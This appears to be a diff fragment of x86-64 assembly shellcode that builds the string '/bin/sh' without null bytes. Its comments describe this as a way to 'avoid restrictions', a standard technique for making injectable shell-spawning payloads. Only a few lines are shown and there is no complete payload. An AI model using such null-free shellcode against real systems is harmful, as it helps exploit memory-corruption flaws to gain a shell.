@@ -6,11 +6,13 @@ _start:
     xor rsi, rsi
     xor rdx, rdx
 
+    ; simple avoid restrictions
     ; mov rax, 0x0067732f6e69622f
     ; mov rbx, 0x0001000000000000
     ; add rax, rbx
     xor rbx, rbx
 
+    ; my variant of avoid restrictions, cause doesn't contain \x00
     mov bl, 0x67
     inc bl
     shl rbx, 8
